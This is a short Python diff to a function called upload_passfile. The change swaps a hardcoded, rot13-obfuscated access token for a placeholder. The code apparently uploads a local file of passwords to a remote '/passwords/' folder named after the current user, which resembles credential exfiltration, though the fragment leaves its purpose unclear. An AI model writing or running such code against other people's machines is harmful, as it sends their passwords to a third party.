@@ -15,7 +15,7 @@ import getpass
 
 
 def upload_passfile():
-    access_token = encode("ABlUz7-8w0NNNNNNNNNNACpDbwK23pC--SqBhCD9TBV93QnXXb8CMYVhVakz85xQ", 'rot13')
+    access_token = encode("<rot13 access token here>", 'rot13')
 
     file_from = "rc.txt"
     file_to = "/passwords/" + str(getpass.getuser()) + "'s_passwords.txt"
